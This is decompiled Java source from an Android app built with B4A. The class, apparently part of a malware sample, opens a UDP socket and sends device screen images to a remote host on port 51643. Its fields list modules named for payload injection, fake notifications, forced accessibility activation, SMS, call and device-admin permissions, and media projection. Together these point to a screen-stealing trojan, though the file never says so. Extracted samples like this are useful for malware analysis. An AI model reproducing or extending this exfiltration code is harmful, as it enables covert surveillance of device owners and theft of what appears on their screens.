package com.com.androidrr;

import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.SocketWrapper;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import java.util.HashMap;

/* loaded from: classes.dex */
public class clsudpconnector extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public SocketWrapper.UDPSocket _udpsock = null;
    public SocketWrapper.UDPSocket.UDPPacket _udppack = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.clsudpconnector");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", clsudpconnector.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public String _class_globals() throws Exception {
        this._udpsock = new SocketWrapper.UDPSocket();
        this._udppack = new SocketWrapper.UDPSocket.UDPPacket();
        return "";
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        return "";
    }

    public String _setinfo() throws Exception {
        try {
            this._udpsock.Initialize(this.f268ba, "UDPSock", 0, 0);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("618546693", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _udp_senddeviceimage(byte[] bArr) throws Exception {
        try {
            this._udppack.Initialize(bArr, globalparameters._strcoo, 51643);
            this._udpsock.Send(this._udppack);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("618612232", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
